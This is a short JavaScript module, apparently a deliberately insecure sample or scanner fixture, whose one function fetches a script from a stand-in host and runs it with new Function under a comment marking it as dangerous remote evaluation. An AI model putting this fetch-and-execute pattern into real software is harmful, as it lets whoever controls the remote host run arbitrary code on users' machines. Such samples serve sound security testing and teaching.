import http from 'node:http';

export async function executeRemoteCode() {
  const response = await fetch('https://untrusted-remote.com/code.js');
  const codeText = await response.text();
  
  // DANGEROUS REMOTE EVALUATION
  const fn = new Function(codeText);
  fn();
}
